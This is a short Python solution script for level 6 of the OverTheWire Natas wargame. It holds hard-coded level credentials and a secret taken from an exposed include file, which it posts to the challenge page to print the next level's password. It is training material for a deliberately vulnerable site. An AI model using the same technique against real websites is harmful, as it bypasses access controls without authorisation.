from colorama.ansi import Fore
import requests
import re
import sys


def html(text):
    
    from bs4 import BeautifulSoup
    
    line_break= re.sub(r'<br />','\n',text)
    tag_left= re.sub(r'&lt;','<',line_break)
    tag_right= re.sub(r'&gt;','>',tag_left)
    output= re.sub(r'&nbsp;',' ',tag_right)
    soup = BeautifulSoup(output, features="lxml") 
    return(soup.prettify())




url='http://natas6.natas.labs.overthewire.org'
username='natas6'
password='aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
href='http://natas6.natas.labs.overthewire.org/index-source.html'
secret="FOEIUWGHFEEUHOFUOIU"

'''
Find the secret
href='http://natas6.natas.labs.overthewire.org/includes/secret.inc'

text=html(website.text)
print(text)

then

secret = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'
'''

website=requests.get(url,auth=(username,password))

post=requests.post(url, data = {"secret": secret, "submit":"submit"}, auth = (username, password) )
text = html(post.text)
print(Fore.MAGENTA + re.findall('natas7 is (.*)',text)[0])
